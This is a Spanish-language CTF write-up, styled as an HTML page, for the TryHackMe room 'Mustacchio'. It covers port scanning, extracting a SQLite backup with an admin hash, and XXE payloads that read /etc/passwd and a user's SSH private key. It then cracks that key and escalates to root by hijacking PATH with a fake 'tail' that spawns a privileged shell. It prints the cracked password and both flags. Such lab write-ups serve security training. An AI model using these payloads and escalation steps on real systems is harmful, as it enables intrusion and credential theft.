<!DOCTYPE html>
<html lang="es">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Mustacchio — Writeup</title>
<link href="https://fonts.googleapis.com/css2?family=Share+Tech+Mono&family=Rajdhani:wght@300;500;700&family=Space+Mono:ital,wght@0,400;0,700;1,400&display=swap" rel="stylesheet">
<style>
  :root {
    --bg: #0a0c0f;
    --bg2: #0f1318;
    --bg3: #141920;
    --accent: #3b82f6;
    --accent2: #ff6b35;
    --accent3: #60a5fa;
    --text: #c8d6e5;
    --text-dim: #5a7080;
    --border: #1e2d3d;
    --red: #ff4757;
    --yellow: #ffd32a;
  }

  * { margin: 0; padding: 0; box-sizing: border-box; }

  body {
    background: var(--bg);
    color: var(--text);
    font-family: 'Rajdhani', sans-serif;
    font-size: 17px;
    line-height: 1.7;
    overflow-x: hidden;
  }

  /* Scanline overlay */
  body::before {
    content: '';
    position: fixed;
    inset: 0;
    background: repeating-linear-gradient(
      0deg,
      transparent,
      transparent 2px,
      rgba(59,130,246,0.012) 2px,
      rgba(59,130,246,0.012) 4px
    );
    pointer-events: none;
    z-index: 999;
  }

  /* HEADER */
  header {
    position: relative;
    padding: 80px 0 60px;
    text-align: center;
    border-bottom: 1px solid var(--border);
    overflow: hidden;
  }

  header::before {
    content: '';
    position: absolute;
    inset: 0;
    background: 
      radial-gradient(ellipse 60% 80% at 50% 0%, rgba(37,99,235,0.10) 0%, transparent 70%),
      radial-gradient(ellipse 40% 40% at 80% 80%, rgba(59,130,246,0.06) 0%, transparent 60%);
  }

  .header-tag {
    font-family: 'Share Tech Mono', monospace;
    font-size: 11px;
    letter-spacing: 4px;
    color: var(--accent3);
    text-transform: uppercase;
    margin-bottom: 16px;
    opacity: 0.8;
  }

  h1 {
    font-family: 'Rajdhani', sans-serif;
    font-size: clamp(52px, 8vw, 96px);
    font-weight: 700;
    letter-spacing: -2px;
    color: #fff;
    line-height: 1;
    position: relative;
  }

  h1 .glow {
    color: var(--accent);
    text-shadow: 0 0 40px rgba(59,130,246,0.5), 0 0 80px rgba(59,130,246,0.25);
  }

  .header-meta {
    margin-top: 24px;
    display: flex;
    gap: 12px;
    justify-content: center;
    flex-wrap: wrap;
  }

  .tag {
    font-family: 'Share Tech Mono', monospace;
    font-size: 11px;
    padding: 4px 12px;
    border: 1px solid;
    letter-spacing: 2px;
  }
  .tag.linux { border-color: var(--accent); color: var(--accent); }
  .tag.web { border-color: var(--accent3); color: var(--accent3); }
  .tag.xxe { border-color: var(--accent2); color: var(--accent2); }
  .tag.path { border-color: var(--yellow); color: var(--yellow); }

  /* LAYOUT */
  .container {
    max-width: 900px;
    margin: 0 auto;
    padding: 0 32px;
  }

  /* SECTION */
  .phase {
    padding: 64px 0;
    border-bottom: 1px solid var(--border);
    animation: fadeIn 0.6s ease both;
  }

  @keyframes fadeIn {
    from { opacity: 0; transform: translateY(20px); }
    to { opacity: 1; transform: translateY(0); }
  }

  .phase-header {
    display: flex;
    align-items: center;
    gap: 20px;
    margin-bottom: 36px;
  }

  .phase-num {
    font-family: 'Share Tech Mono', monospace;
    font-size: 11px;
    color: var(--accent);
    letter-spacing: 3px;
    white-space: nowrap;
    opacity: 0.7;
  }

  .phase-line {
    flex: 1;
    height: 1px;
    background: linear-gradient(90deg, var(--border), transparent);
  }

  h2 {
    font-family: 'Rajdhani', sans-serif;
    font-size: 32px;
    font-weight: 700;
    color: #fff;
    letter-spacing: 1px;
    margin-bottom: 24px;
  }

  h2 .accent { color: var(--accent); }
  h2 .accent2 { color: var(--accent2); }
  h2 .accent3 { color: var(--accent3); }
  h2 .yellow { color: var(--yellow); }

  p {
    color: var(--text);
    margin-bottom: 16px;
    font-weight: 300;
    font-size: 17px;
  }

  /* CODE BLOCKS */
  .code-block {
    background: var(--bg2);
    border: 1px solid var(--border);
    border-left: 3px solid var(--accent);
    padding: 20px 24px;
    margin: 20px 0;
    font-family: 'Share Tech Mono', monospace;
    font-size: 13px;
    color: #93c5fd;
    overflow-x: auto;
    position: relative;
    line-height: 1.8;
    white-space: pre;
  }

  .code-block.xml { border-left-color: var(--accent3); color: #a5b4fc; }
  .code-block.cmd { border-left-color: var(--accent2); color: #f0a080; }
  .code-block.output { border-left-color: var(--text-dim); color: var(--text-dim); font-size: 12px; }

  .code-label {
    font-family: 'Share Tech Mono', monospace;
    font-size: 10px;
    letter-spacing: 3px;
    color: var(--text-dim);
    text-transform: uppercase;
    margin-bottom: 8px;
  }

  /* FINDING BOXES */
  .finding {
    background: var(--bg3);
    border: 1px solid var(--border);
    padding: 20px 24px;
    margin: 20px 0;
    position: relative;
  }

  .finding::before {
    content: '!';
    position: absolute;
    top: -1px;
    left: -1px;
    background: var(--accent2);
    color: #000;
    font-family: 'Share Tech Mono', monospace;
    font-size: 11px;
    font-weight: bold;
    padding: 2px 8px;
    letter-spacing: 2px;
  }

  .finding.info::before { content: 'INFO'; background: var(--accent3); }
  .finding.success::before { content: 'PWN'; background: var(--accent); color: #fff; }
  .finding.vuln::before { content: 'VULN'; background: var(--red); }

  .finding-title {
    font-family: 'Rajdhani', sans-serif;
    font-size: 14px;
    font-weight: 700;
    letter-spacing: 2px;
    text-transform: uppercase;
    color: var(--text-dim);
    margin-bottom: 8px;
    padding-top: 4px;
  }

  /* PORTS TABLE */
  .ports-table {
    width: 100%;
    border-collapse: collapse;
    font-family: 'Share Tech Mono', monospace;
    font-size: 13px;
    margin: 20px 0;
  }

  .ports-table th {
    text-align: left;
    color: var(--accent);
    letter-spacing: 3px;
    font-size: 10px;
    padding: 8px 16px;
    border-bottom: 1px solid var(--border);
  }

  .ports-table td {
    padding: 10px 16px;
    border-bottom: 1px solid rgba(30,45,61,0.5);
    color: var(--text);
  }

  .ports-table tr:hover td { background: rgba(59,130,246,0.03); }

  .port-open { color: var(--accent); }
  .port-num { color: var(--accent2); font-weight: bold; }

  /* ATTACK CHAIN */
  .chain {
    display: flex;
    flex-direction: column;
    gap: 0;
    margin: 32px 0;
  }

  .chain-step {
    display: flex;
    gap: 20px;
    align-items: flex-start;
  }

  .chain-icon {
    width: 40px;
    height: 40px;
    border: 1px solid var(--border);
    display: flex;
    align-items: center;
    justify-content: center;
    font-family: 'Share Tech Mono', monospace;
    font-size: 13px;
    color: var(--accent);
    flex-shrink: 0;
    background: var(--bg2);
  }

  .chain-connector {
    width: 40px;
    display: flex;
    justify-content: center;
    padding: 4px 0;
    flex-shrink: 0;
  }

  .chain-connector::before {
    content: '';
    width: 1px;
    height: 100%;
    background: linear-gradient(180deg, var(--border), transparent);
    min-height: 20px;
    display: block;
  }

  .chain-content {
    padding-bottom: 24px;
  }

  .chain-title {
    font-family: 'Rajdhani', sans-serif;
    font-weight: 700;
    font-size: 18px;
    color: #fff;
    margin-bottom: 4px;
  }

  .chain-desc {
    font-size: 15px;
    color: var(--text-dim);
    font-weight: 300;
  }

  /* FLAGS */
  .flag-box {
    background: rgba(59,130,246,0.04);
    border: 1px solid rgba(59,130,246,0.25);
    padding: 16px 24px;
    margin: 20px 0;
    display: flex;
    align-items: center;
    gap: 16px;
  }

  .flag-label {
    font-family: 'Share Tech Mono', monospace;
    font-size: 10px;
    letter-spacing: 3px;
    color: var(--accent);
    white-space: nowrap;
  }

  .flag-value {
    font-family: 'Share Tech Mono', monospace;
    font-size: 14px;
    color: #fff;
    word-break: break-all;
  }

  /* FOOTER */
  footer {
    padding: 48px 0;
    text-align: center;
  }

  .footer-text {
    font-family: 'Share Tech Mono', monospace;
    font-size: 11px;
    color: var(--text-dim);
    letter-spacing: 3px;
  }

  /* Inline code */
  code {
    font-family: 'Share Tech Mono', monospace;
    font-size: 13px;
    color: var(--accent);
    background: rgba(59,130,246,0.08);
    padding: 1px 6px;
  }

  .highlight { color: var(--accent2); }

  /* Divider */
  .divider {
    height: 1px;
    background: linear-gradient(90deg, transparent, var(--border), transparent);
    margin: 8px 0;
  }
</style>
</head>
<body>

<header>
  <div class="container">
    <div class="header-tag">// TryHackMe — CTF Writeup</div>
    <h1>MUSTA<span class="glow">CCHIO</span></h1>
    <div class="header-meta">
      <span class="tag linux">#linux</span>
      <span class="tag web">#web</span>
      <span class="tag xxe">#XXE</span>
      <span class="tag path">#path-hijacking</span>
    </div>
  </div>
</header>

<main class="container">

  <!-- FASE 1: RECONOCIMIENTO -->
  <section class="phase">
    <div class="phase-header">
      <span class="phase-num">// 01</span>
      <div class="phase-line"></div>
    </div>
    <h2><span class="accent">RECONOCIMIENTO</span> — Escaneo de puertos</h2>
    <p>Lo primero es descubrir qué superficie de ataque tiene el objetivo. Se lanza un escaneo completo de puertos para no dejar nada sin revisar.</p>

    <div class="code-label">escaneo inicial</div>
    <div class="code-block cmd">nmap -p- -T5 &lt;IP&gt; -oG allPorts</div>

    <p>Se encuentran tres puertos abiertos. El puerto 8765 es desconocido, así que se profundiza con detección de versiones y scripts:</p>

    <div class="code-label">escaneo profundo</div>
    <div class="code-block cmd">nmap -p22,80,8765 -sSCV -T5 -n -Pn -vvv &lt;IP&gt; -oN scan.txt</div>

    <table class="ports-table">
      <thead>
        <tr>
          <th>PUERTO</th>
          <th>ESTADO</th>
          <th>SERVICIO</th>
          <th>VERSIÓN</th>
        </tr>
      </thead>
      <tbody>
        <tr>
          <td class="port-num">22/tcp</td>
          <td class="port-open">OPEN</td>
          <td>SSH</td>
          <td>OpenSSH 7.2p2</td>
        </tr>
        <tr>
          <td class="port-num">80/tcp</td>
          <td class="port-open">OPEN</td>
          <td>HTTP</td>
          <td>Apache 2.4.18</td>
        </tr>
        <tr>
          <td class="port-num">8765/tcp</td>
          <td class="port-open">OPEN</td>
          <td>HTTP</td>
          <td>nginx 1.10.3</td>
        </tr>
      </tbody>
    </table>

    <div class="finding info">
      <div class="finding-title">Resultado</div>
      El puerto 8765 resulta ser un segundo servicio web corriendo en nginx. Objetivo de enumeración adicional.
    </div>
  </section>

  <!-- FASE 2: ENUMERACION WEB -->
  <section class="phase">
    <div class="phase-header">
      <span class="phase-num">// 02</span>
      <div class="phase-line"></div>
    </div>
    <h2><span class="accent3">ENUMERACIÓN</span> — Fichero users.bak</h2>
    <p>Se lanza gobuster contra el servicio web del puerto 80 para descubrir rutas ocultas:</p>

    <div class="code-label">fuzzing de directorios</div>
    <div class="code-block cmd">gobuster dir -u "http://&lt;IP&gt;/" -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt -x php,txt,html,js</div>

    <p>Entre los resultados aparece el directorio <code>/custom</code>, desde donde es posible descargar un fichero llamado <code>users.bak</code>. Un simple <code>cat</code> no revela nada útil, pero <code>file</code> identifica su naturaleza:</p>

    <div class="code-block output">users.bak: SQLite 3.x database, last written using SQLite version 3034001</div>

    <p>Se renombra a <code>users.sql</code> y se inspecciona con <code>sqlite3</code>:</p>

    <div class="code-label">extracción de credenciales</div>
    <div class="code-block">sqlite3 users.sql
sqlite&gt; .tables
users
sqlite&gt; SELECT * FROM users;
admin|1868e36a6d2b17d4c2745f1659433a54d4bc5f4b</div>

    <div class="finding vuln">
      <div class="finding-title">Credenciales encontradas</div>
      Usuario <span class="highlight">admin</span> con hash SHA1. Se crackea con john y rockyou.txt obteniendo la contraseña: <span class="highlight">bulldog19</span>
    </div>

    <div class="code-label">cracking del hash</div>
    <div class="code-block cmd">john --wordlist=/usr/share/wordlists/rockyou.txt admin_hash.txt</div>

    <p>Con estas credenciales se accede al panel de administración en el puerto 8765, que presenta un formulario para añadir comentarios en formato XML.</p>
  </section>

  <!-- FASE 3: XXE -->
  <section class="phase">
    <div class="phase-header">
      <span class="phase-num">// 03</span>
      <div class="phase-line"></div>
    </div>
    <h2><span class="accent2">XXE INJECTION</span> — Lectura de ficheros</h2>
    <p>El panel acepta XML y refleja el contenido en la respuesta. Esto lo hace potencialmente vulnerable a XML External Entity (XXE). Primero se comprueba que el XML básico se procesa correctamente, luego se inyecta una entidad externa maliciosa:</p>

    <div class="code-label">payload xxe — /etc/passwd</div>
    <div class="code-block xml">&lt;?xml version="1.0" encoding="UTF-8"?&gt;
&lt;!DOCTYPE comment [ &lt;!ENTITY xxe SYSTEM "file:///etc/passwd"&gt; ]&gt;
&lt;comment&gt;
    &lt;name&gt;&amp;xxe;&lt;/name&gt;
    &lt;author&gt;Author&lt;/author&gt;
    &lt;com&gt;test&lt;/com&gt;
&lt;/comment&gt;</div>

    <p>La respuesta devuelve el contenido de <code>/etc/passwd</code>. Revisando el código fuente de la página se encuentran dos pistas clave:</p>

    <div class="code-block output">&lt;!-- Barry, you can now SSH in using your key!--&gt;
//document.cookie = "Example=/auth/dontforget.bak";</div>

    <p>El usuario <span class="highlight">barry</span> tiene una clave SSH privada. Se extrae con XXE:</p>

    <div class="code-label">payload xxe — clave privada SSH</div>
    <div class="code-block xml">&lt;?xml version="1.0" encoding="UTF-8"?&gt;
&lt;!DOCTYPE comment [ &lt;!ENTITY xxe SYSTEM "file:///home/barry/.ssh/id_rsa"&gt; ]&gt;
&lt;comment&gt;
    &lt;name&gt;&amp;xxe;&lt;/name&gt;
    &lt;author&gt;Author&lt;/author&gt;
    &lt;com&gt;test&lt;/com&gt;
&lt;/comment&gt;</div>

    <div class="finding vuln">
      <div class="finding-title">Clave RSA obtenida</div>
      La clave está cifrada (AES-128-CBC). Se usa <code>ssh2john</code> + <code>john</code> para obtener la passphrase. Además, la clave tenía un espacio extra al inicio del fichero que impedía su uso — se elimina con <code>sed -i '1s/^ //' id_rsa</code>.
    </div>

    <div class="code-label">cracking de la passphrase</div>
    <div class="code-block cmd">ssh2john id_rsa &gt; id_rsa.hash
john id_rsa.hash --wordlist=/usr/share/wordlists/rockyou.txt</div>

    <div class="code-label">acceso SSH</div>
    <div class="code-block cmd">chmod 600 id_rsa
ssh -i id_rsa barry@&lt;IP&gt;</div>

    <div class="flag-box">
      <span class="flag-label">USER FLAG</span>
      <span class="flag-value">62d77a4d5f97d47c5aa38b3b2651b831</span>
    </div>
  </section>

  <!-- FASE 4: PRIVESC -->
  <section class="phase">
    <div class="phase-header">
      <span class="phase-num">// 04</span>
      <div class="phase-line"></div>
    </div>
    <h2><span class="yellow">PRIVILEGE ESCALATION</span> — PATH Hijacking</h2>
    <p>En el directorio del usuario <code>joe</code> existe un binario con bit SUID llamado <code>live_log</code> que muestra logs de nginx en tiempo real. Se analiza con <code>strings</code>:</p>

    <div class="code-block output">Live Nginx Log Reader
tail -f /var/log/nginx/access.log</div>

    <div class="finding vuln">
      <div class="finding-title">Vulnerabilidad</div>
      El binario llama a <code>tail</code> usando <strong>ruta relativa</strong>, lo que permite sustituirlo con un ejecutable malicioso manipulando la variable <code>$PATH</code>.
    </div>

    <p>Se crea un binario falso llamado <code>tail</code> en <code>/tmp</code> que lanza una bash con privilegios, se añade <code>/tmp</code> al inicio del PATH y se ejecuta el binario SUID:</p>

    <div class="code-label">explotación — path hijacking</div>
    <div class="code-block cmd">echo '/bin/bash -p' &gt; /tmp/tail
chmod +x /tmp/tail
export PATH=/tmp:$PATH
cd /home/joe
./live_log</div>

    <div class="code-block output">root@mustacchio:/home/joe# whoami
root</div>

    <div class="flag-box">
      <span class="flag-label">ROOT FLAG</span>
      <span class="flag-value">3223581420d906c4dd1a5f9b530393a5</span>
    </div>
  </section>

  <!-- ATTACK CHAIN SUMMARY -->
  <section class="phase">
    <div class="phase-header">
      <span class="phase-num">// RESUMEN</span>
      <div class="phase-line"></div>
    </div>
    <h2>CADENA DE <span class="accent">ATAQUE</span></h2>

    <div class="chain">
      <div class="chain-step">
        <div class="chain-icon">01</div>
        <div class="chain-content">
          <div class="chain-title">Enumeración Web</div>
          <div class="chain-desc">Gobuster descubre <code>/custom</code> con el fichero <code>users.bak</code> (SQLite con credenciales admin)</div>
        </div>
      </div>
      <div class="chain-step">
        <div class="chain-connector"></div>
        <div></div>
      </div>
      <div class="chain-step">
        <div class="chain-icon">02</div>
        <div class="chain-content">
          <div class="chain-title">Cracking de credenciales</div>
          <div class="chain-desc">Hash SHA1 crackeado con john → <code>admin:bulldog19</code> → acceso al panel XML en :8765</div>
        </div>
      </div>
      <div class="chain-step">
        <div class="chain-connector"></div>
        <div></div>
      </div>
      <div class="chain-step">
        <div class="chain-icon">03</div>
        <div class="chain-content">
          <div class="chain-title">XXE Injection</div>
          <div class="chain-desc">Parser XML vulnerable permite leer ficheros del servidor → se extrae la clave SSH privada de barry</div>
        </div>
      </div>
      <div class="chain-step">
        <div class="chain-connector"></div>
        <div></div>
      </div>
      <div class="chain-step">
        <div class="chain-icon">04</div>
        <div class="chain-content">
          <div class="chain-title">Acceso SSH</div>
          <div class="chain-desc">Passphrase crackeada con ssh2john → shell como barry → flag de usuario</div>
        </div>
      </div>
      <div class="chain-step">
        <div class="chain-connector"></div>
        <div></div>
      </div>
      <div class="chain-step">
        <div class="chain-icon" style="border-color: var(--accent); color: var(--accent);">⚡</div>
        <div class="chain-content">
          <div class="chain-title" style="color: var(--accent);">Root via PATH Hijacking</div>
          <div class="chain-desc">Binario SUID <code>live_log</code> llama a <code>tail</code> con ruta relativa → <code>/tmp/tail</code> malicioso → shell de root</div>
        </div>
      </div>
    </div>
  </section>

</main>

<footer>
  <div class="container">
    <div class="divider"></div>
    <br>
    <div class="footer-text">MUSTACCHIO // WRITEUP // TRYHACKME</div>
  </div>
</footer>

</body>
</html>
